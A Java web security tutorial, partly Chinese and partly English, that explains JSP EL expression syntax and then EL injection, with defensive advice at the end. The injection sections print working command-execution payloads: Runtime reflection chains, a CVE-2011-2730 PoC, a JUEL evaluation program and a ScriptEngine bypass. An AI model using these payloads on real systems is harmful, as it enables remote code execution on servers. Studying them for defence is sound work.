# Java安全学习—EL表达式注入

Author: H3rmesk1t

Data: 2022.03.17

# EL 简介
[EL](https://baike.baidu.com/item/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/1190845)(Expression Language)是为了使`JSP`写起来更加简单. 表达式语言的灵感来自于`ECMAScript`和`XPath`表达式语言, 它提供了在`JSP`中简化表达式的方法, 让`JSP`的代码更加简化.

`EL`表达式主要功能如下:
 - 获取数据: `EL`表达式主要用于替换`JSP`页面中的脚本表达式, 以从各种类型的`Web`域中检索`Java`对象、获取数据(某个`Web`域中的对象, 访问`JavaBean`的属性、访问`List`集合、访问`Map`集合、访问数组).
 - 执行运算: 利用`EL`表达式可以在`JSP`页面中执行一些基本的关系运算、逻辑运算和算术运算, 以在`JSP`页面中完成一些简单的逻辑运算, 例如`${user==null}`.
 - 获取`Web`开发常用对象: `EL`表达式定义了一些隐式对象, 利用这些隐式对象, `Web`开发人员可以很轻松获得对`Web`常用对象的引用, 从而获得这些对象中的数据.
 - 调用`Java`方法: `EL`表达式允许用户开发自定义`EL`函数, 以在`JSP`页面中通过`EL`表达式调用`Java`类的方法.

`EL`表达式特点如下:
 - 可得到`PageContext`属性值.
 - 可直接访问`JSP`的内置对象, 如`page`, `request`, `session`, `application`等.
 - 运算符丰富, 有关系运算符、逻辑运算符、算术运算符等.
 - 扩展函数可与`JAVA`类的静态方法对应.

# EL 基本语法
在`JSP`中访问模型对象是通过`EL`表达式的语法来表达. 所有`EL`表达式的格式都是以`${}`表示. 例如, `${userinfo}`代表获取变量`userinfo`的值. 当`EL`表达式中的变量不给定范围时, 则默认在`page`范围查找, 然后依次在`request`、`session`、`application`范围查找. 也可以用范围作为前缀表示属于哪个范围的变量, 例如: `${pageScope. userinfo}`表示访问`page`范围中的`userinfo`变量.

## [] 与 . 运算符
`EL`表达式提供`.`和`[]`两种运算符来存取数据. 当要存取的属性名称中包含一些特殊字符, 如`.`或`-`等并非字母或数字的符号, 就一定要使用`[]`. 例如: `${user.My-Name}`应当改为`${user["My-Name"]}`. 如果要动态取值时, 就可以用`[]`来做, 而`.`无法做到动态取值, 例如: `${sessionScope.user[data]}`中`data`是一个变量.

## 变量
`EL`表达式存取变量数据的方法很简单, 例如: `${username}`. 它的意思是取出某一范围中名称为`username`的变量. 因为我们并没有指定哪一个范围的`username`, 所以它会依序从`Page`、`Request`、`Session`、`Application`范围查找. 假如途中找到`username`, 就直接回传, 不再继续找下去, 但是假如全部的范围都没有找到时, 就回传`""`.

`EL`表达式的属性如下:

|||
|:----:|:----:|
|Page|PageScope|
|Request|RequestScope|
|Session|SessionScope|
|Application|Application|

`JSP`表达式语言定义可在表达式中使用的以下文字:

|||
|:----:|:----:|
|Boolean|`true`和`false`|
|Integer|与`Java`类似, 可以包含任何整数, 例如: `24`、`-45`、`567`|
|Floating Point|与`Java`类似, 可以包含任何正的或负的浮点数, 例如: `-1.8E-45`、`4.567`|
|String|任何由单引号或双引号限定的字符串. 对于单引号、双引号和反斜杠, 使用反斜杠字符作为转义序列. 必须注意, 如果在字符串两端使用双引号, 则单引号不需要转义.|
|Null|`null`|

## 操作符
`JSP`表达式语言提供以下操作符, 其中大部分是`Java`中常用的操作符:

|术语|定义|
|:----:|:----:|
|算术型|`+`、`-`(二元)、`*`、`/`、`div`、`%`、`mod`、`-`(一元).|
|逻辑型|`and`、`&&`、`or`、`||`、`!`、`not`.|
|关系型|`==`、`eq`、`!=`、`ne`、`<`、`lt`、`>`、`gt`、`<=`、`le`、`>=`、`ge`. 可以与其他值进行比较, 或与布尔型、字符串型、整型或浮点型文字进行比较.|
|空|`empty`空操作符是前缀操作, 可用于确定值是否为空.|
|条件型|`A ? B : C`. 根据`A`赋值的结果来赋值`B`或`C`.|

## 隐式对象
`JSP`表达式语言定义了一组隐式对象, 其中许多对象在`JSP Scriplet`和表达式中可用:

|术语|定义|
|:----:|:----:|
|pageContext|`JSP`页的上下文, 可以用于访问`JSP`隐式对象, 如请求、响应、会话、输出、`servletContext`等. 例如, `${pageContext.response}`为页面的响应对象赋值.|

此外, 还提供几个隐式对象, 允许对以下对象进行简易访问:

|术语|定义|
|:----:|:----:|
|param|将请求参数名称映射到单个字符串参数值(通过调用`ServletRequest.getParameter(String name)`获得). `getParameter(String)`方法返回带有特定名称的参数. 表达式`${param.name}`相当于`request.getParameter(name)`.|
|paramValues|将请求参数名称映射到一个数值数组(通过调用`ServletRequest.getParameter(String name)`获得). 它与`param`隐式对象非常类似, 但它检索一个字符串数组而不是单个值. 表达式`${paramvalues.name}`相当于`request.getParamterValues(name)`.
|header|将请求头名称映射到单个字符串头值(通过调用`ServletRequest.getHeader(String name)`获得). 表达式`${header.name}`相当于`request.getHeader(name)`.|
|headerValues|将请求头名称映射到一个数值数组(通过调用`ServletRequest.getHeaders(String)`获得). 它与头隐式对象非常类似, 表达式`${headerValues.name}`相当于`request.getHeaderValues(name)`.|
|cookie|将`cookie`名称映射到单个`cookie`对象. 向服务器发出的客户端请求可以获得一个或多个`cookie`. 表达式`${cookie.name.value}`返回带有特定名称的第一个`cookie`值. 如果请求包含多个同名的`cookie`, 则应该使用`${headerValues.name}`表达式.|
|initParam|将上下文初始化参数名称映射到单个值(通过调用`ServletContext.getInitparameter(String name)`获得).|

除了上述两种类型的隐式对象之外, 还有些对象允许访问多种范围的变量, 如`Web 上下文`、`会话`、`请求`、`页面`:

|术语|定义|
|:----:|:----:|
|pageScope|将页面范围的变量名称映射到其值. 例如, `EL`表达式可以使用`${pageScope.objectName}`访问一个`JSP`中页面范围的对象, 还可以使用`${pageScope.objectName.attributeName}`访问对象的属性.|
|requestScope|将请求范围的变量名称映射到其值, 该对象允许访问请求对象的属性. 例如, `EL`表达式可以使用`${requestScope.objectName}`访问一个`JSP`请求范围的对象, 还可以使用`${requestScope.objectName.attributeName}`访问对象的属性.|
|sessionScope|将会话范围的变量名称映射到其值, 该对象允许访问会话对象的属性. 例如, `${sessionScope.name}`.|
|applicationScope|将应用程序范围的变量名称映射到其值, 该隐式对象允许访问应用程序范围的对象.|

## EL 函数
`EL`允许您在表达式中使用函数, 这些函数必须被定义在自定义标签库中. 要使用任何标签库中的函数, 需要将这些库
Install on the server and then use the `<taglib>` tag to include these libraries in the JSP file. The syntax for using the function is as follows:

```java
${ns:func(param1, param2, ...)}

ns: namespace
func: refers to the name of the function
paramx: Parameters
```

## EL calls Java methods
First create a new ELFunc class, and the defined `doSomething` function is used to output `Hello, xxx!`:

```java
package h3rmek1t.javawebsecurity;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/17 11:24 pm
 */
public class ELFunc {

    public static String doSomething(String str) {

        return "Hello, " + str + "!";
    }
}
```

Then create a new `test.tld` file in the `WEB-INF` folder, specifying the executed `Java` method and its `URI` address:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<taglib version="2.0" xmlns="http://java.sun.com/xml/ns/j2ee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd">
    <tlib-version>1.0</tlib-version>
    <short-name>ELFunc</short-name>
    <uri>http://www.h3rmesk1t.com/ELFunc</uri>
    <function>
        <name>doSomething</name>
        <function-class>h3rmek1t.javawebsecurity.ELFunc</function-class>
        <function-signature> java.lang.String doSomething(java.lang.String)</function-signature>
    </function>
</taglib>
```

In the `JSP` file, first import the `taglib` tag library in the head, the `URI` is the `URI` address set in `test.tld`, and the `prefix` is the `short-name` set in `test.tld`, and then directly call the method of this class using the `class name: method name()` form in the `EL` expression:

```java
<%@taglib uri="http://www.h3rmesk1t.com/ELFunc" prefix="ELFunc"%>
${ELFunc:doSomething("h3rmesk1t")}
```

<div align=center><img src="./images/1.png"></div>

# Start/disable EL expressions in JSP
## Globally disable EL expressions
In `web.xml`, perform the following configuration:

```xml
<jsp-config>
    <jsp-property-group>
        <url-pattern>*.jsp</url-pattern>
        <el-ignored>true</el-ignored>
    </jsp-property-group>
</jsp-config>
```

## Disable EL expressions in a single file
In the `JSP` file, there can be the following definition to indicate whether to disable the `EL` expression. `true` means prohibited, and `false` means not prohibited. The `EL` expression is enabled by default in `JSP2.0`.

```java
<%@ page isELIgnored="true" %>
```

<div align=center><img src="./images/2.png"></div>

# EL Expression Injection Vulnerability
Principle of EL` expression injection vulnerability: The external controllable expression causes the attacker to inject malicious expressions to implement arbitrary code execution. Generally speaking, the external controllable point entry of the EL` expression injection vulnerability is in the `Java` program code, that is, the content of the EL` expression in the `Java` program is obtained from the outside in all or part.

## General PoC
```java
// Corresponding to the pageContext object in the JSP page.
${pageContext}

// Get the web path.
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

// File header parameters.
${header}

// Get webRoot.
${applicationScope}

// Execute the command.
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
```

<div align=center><img src="./images/3.png"></div>

## CVE-2011-2730
The command execution of `PoC` is as follows:

```java
<spring:message text=
"${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
</spring:message>
```

## JUEL
EL` was once part of `JSTL`, and then `EL` entered the JSP 2.0 standard. Now `EL API` has been detached into the package `javax.el`, and all dependencies on the core `JSP` class have been removed, that is, the packages `javax.el`, etc. that are now `JUEL` related `jar` packages.

[JUEL](http://juel.sourceforge.net/)(Java Unified Expression Language) is a lightweight and efficient implementation of unified expression language, with high performance, plug-in cache, small size, support for method calls and multi-parameter calls, and pluggable and pluggable features.

For example, the following code uses reflection to call the `Runtime` class method to implement command execution:

```xml
<dependency>
    <groupId>de.odysseus.juel</groupId>
    <artifactId>juel-api</artifactId>
    <version>2.2.7</version>
</dependency>
<dependency>
    <groupId>de.odysseus.juel</groupId>
    <artifactId>juel-spi</artifactId>
    <version>2.2.7</version>
</dependency>
<dependency>
    <groupId>de.odysseus.juel</groupId>
    <artifactId>juel-impl</artifactId>
    <version>2.2.7</version>
</dependency>
```

```java
package h3rmek1t.javawebsecurity;

import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.util.SimpleContext;

import javax.el.ExpressionFactory;
import javax.el.ValueExpression;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/18 12:05 AM
 */
public class ElShell {

    public static void main(String[] args) {

        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();
        String shell = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getC
lass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a Calculator')}";
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, shell, String.class);
        System.out.println(valueExpression.getValue(simpleContext));
    }
}
```

<div align=center><img src="./images/4.png"></div>

# Bypass method
## Use reflection mechanism
The same as the `JUEL` reflective call to the `Runtime` class method implements command execution.

## Use ScriptEngine to call the JS engine bypass
This is the same method as `SpEL` injection.
```java
${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator')")}
```

# Defense Method
 - Try not to use external input as the content of the `EL` expression;
 - When using external input content as the content of `EL` expression, the `Payload` keyword of the `EL` expression injection vulnerability needs to be strictly filtered;
 - Troubleshoot the `JUEL` related code in the `Java` program, search for the following key class methods
   - javax.el.ExpressionFactory.createValueExpression()
   - javax.el.ValueExpression.getValue()

# refer to
 - [EL expression](https://baike.baidu.com/item/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/1190845)
 - [A brief analysis of EL expression injection vulnerability](https://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)